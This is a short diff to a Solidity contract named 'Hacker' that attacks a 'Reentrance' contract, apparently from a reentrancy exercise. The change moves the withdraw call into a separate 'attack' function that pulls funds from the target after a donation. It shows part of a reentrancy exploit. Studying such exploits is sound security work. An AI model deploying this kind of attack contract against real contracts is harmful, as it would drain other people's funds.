@@ -43,7 +43,11 @@ contract Hacker {
     hacker = msg.sender;
     reentrance = Reentrance(_reentrancyAddress);
     reentrance.donate{ value: msg.value }(address(this));
-    reentrance.withdraw(msg.value);
+    
+  }
+
+  function attack(uint _amount) external payable {
+    reentrance.withdraw(_amount);
   }
 
   function getBalance() external view returns (uint256) {
